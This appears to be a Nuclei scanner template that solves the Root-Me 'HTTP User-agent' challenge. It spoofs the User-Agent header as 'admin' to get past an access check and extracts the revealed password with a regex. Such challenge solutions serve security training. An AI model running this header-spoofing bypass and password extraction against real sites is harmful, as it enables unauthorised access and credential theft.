id: HTTP-User-agent
info:
  author: Tomitom13
  name: HTTP User-agent
  severity: unknown
  tags: user-agent,http,rootme
requests:
- extractors:
  - name: password
    part: body
    regex:
    - 'Password: [a-zA-Z0-9!@#$%^&*()_+,.<>?]+'
    type: regex
  headers:
    User-Agent: admin
  matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - <h3>Welcome master!
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
